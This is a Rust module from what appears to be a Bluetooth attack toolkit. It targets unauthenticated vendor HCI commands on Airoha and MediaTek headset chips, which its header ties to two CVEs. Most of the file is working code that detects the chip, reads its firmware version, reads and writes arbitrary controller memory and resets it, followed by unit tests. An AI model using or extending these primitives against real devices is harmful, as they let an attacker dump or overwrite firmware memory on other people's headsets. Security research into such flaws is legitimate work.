//! Airoha AR3011 / MediaTek MTK headset-SoC vendor HCI helpers.
//!
//! Targets CVE-2024-47875 (AR3011 diag write to code region) and
//! CVE-2024-21743 (MTK write-memory OOB). These controllers expose a
//! vendor-specific OGF `0x3F` (opcode `0xFC00 | OCF`) accepting memory
//! read/write and firmware-update OCFs without authentication.

use std::time::Duration;

use anyhow::{Result, anyhow};

use super::hci::{HciSocket, hci_status_name};

pub const OGF_VENDOR: u16 = 0x3F;
const OGF_SHIFT: u16 = 10;
const AIROHA_OCF_READ_MEMORY: u16 = 0x0001;
const AIROHA_OCF_WRITE_MEMORY: u16 = 0x0002;
const AIROHA_OCF_FIRMWARE_VERSION: u16 = 0x0010;
const AIROHA_OCF_CHIP_RESET: u16 = 0x0050;

pub const AIROHA_VENDOR_OPCODE: u16 = OGF_VENDOR << OGF_SHIFT;

fn vendor_opcode(ocf: u16) -> u16 {
    AIROHA_VENDOR_OPCODE | (ocf & 0x03FF)
}

pub fn build_read_memory(addr: u32, len: u8) -> Vec<u8> {
    let mut out = Vec::with_capacity(5);
    out.extend_from_slice(&addr.to_le_bytes());
    out.push(len);
    out
}

pub fn build_write_memory(addr: u32, data: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(5 + data.len());
    out.extend_from_slice(&addr.to_le_bytes());
    out.push(data.len() as u8);
    out.extend_from_slice(data);
    out
}

pub struct AirohaHandle;

impl AirohaHandle {
    pub fn open(dev_id: u16) -> Result<HciSocket> {
        HciSocket::open(dev_id, super::hci::HCI_CHANNEL_USER)
    }

    pub fn detect(hci: &mut HciSocket) -> Result<bool> {
        let opcode = vendor_opcode(AIROHA_OCF_FIRMWARE_VERSION);
        let ev = match hci.command(opcode, &[], Duration::from_secs(2)) {
            Ok(ev) => ev,
            Err(e) => {
                tracing::debug!("Airoha detect: vendor opcode not supported: {e:#}");
                return Ok(false);
            }
        };
        if ev.params.is_empty() {
            return Ok(false);
        }
        let start = ev
            .params
            .iter()
            .position(|b| *b != 0)
            .ok_or_else(|| anyhow!("Airoha detect: empty firmware version reply"))?;
        let slice = &ev.params[start..];
        let text = String::from_utf8_lossy(slice).to_ascii_lowercase();
        Ok(text.contains("airoha") || text.contains("mtk") || text.contains("mediatek"))
    }

    pub fn firmware_version(hci: &mut HciSocket) -> Result<String> {
        let opcode = vendor_opcode(AIROHA_OCF_FIRMWARE_VERSION);
        let ev = hci.command(opcode, &[], Duration::from_secs(2))?;
        if ev.params.is_empty() {
            return Err(anyhow!("Airoha firmware-version: empty reply"));
        }
        let start = ev
            .params
            .iter()
            .position(|b| *b != 0)
            .ok_or_else(|| anyhow!("Airoha firmware-version: null-padded reply"))?;
        Ok(String::from_utf8_lossy(&ev.params[start..]).to_string())
    }

    pub fn read_memory(hci: &mut HciSocket, addr: u32, len: u8) -> Result<Vec<u8>> {
        let opcode = vendor_opcode(AIROHA_OCF_READ_MEMORY);
        let params = build_read_memory(addr, len);
        let ev = hci.command(opcode, &params, Duration::from_secs(2))?;
        if ev.params.is_empty() {
            return Err(anyhow!("Airoha read-memory: empty reply"));
        }
        let status = ev.params[0];
        if status != 0 {
            anyhow::bail!(
                "Airoha read-memory: status 0x{status:02X} ({})",
                hci_status_name(status)
            );
        }
        Ok(ev.params[1..].to_vec())
    }

    pub fn write_memory(hci: &mut HciSocket, addr: u32, data: &[u8]) -> Result<()> {
        let opcode = vendor_opcode(AIROHA_OCF_WRITE_MEMORY);
        let params = build_write_memory(addr, data);
        let ev = hci.command(opcode, &params, Duration::from_secs(2))?;
        if ev.params.is_empty() {
            return Err(anyhow!("Airoha write-memory: empty reply"));
        }
        let status = ev.params[0];
        if status != 0 {
            anyhow::bail!(
                "Airoha write-memory: status 0x{status:02X} ({})",
                hci_status_name(status)
            );
        }
        Ok(())
    }

    pub fn chip_reset(hci: &mut HciSocket) -> Result<()> {
        let opcode = vendor_opcode(AIROHA_OCF_CHIP_RESET);
        hci.command(opcode, &[], Duration::from_secs(2))
            .map(|_| ())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn opcode_layout() {
        assert_eq!(vendor_opcode(AIROHA_OCF_FIRMWARE_VERSION), 0xFC10);
        assert_eq!(vendor_opcode(AIROHA_OCF_WRITE_MEMORY), 0xFC02);
    }

    #[test]
    fn write_memory_buffer_layout() {
        let buf = build_write_memory(0x1234_5678, &[0xAA, 0xBB]);
        assert_eq!(buf.len(), 7);
        assert_eq!(&buf[..4], &[0x78, 0x56, 0x34, 0x12]);
        assert_eq!(buf[4], 2);
        assert_eq!(&buf[5..], &[0xAA, 0xBB]);
    }

    #[test]
    fn read_memory_buffer_layout() {
        let buf = build_read_memory(0x0102_0304, 8);
        assert_eq!(&buf[..4], &[0x04, 0x03, 0x02, 0x01]);
        assert_eq!(buf[4], 8);
    }
}

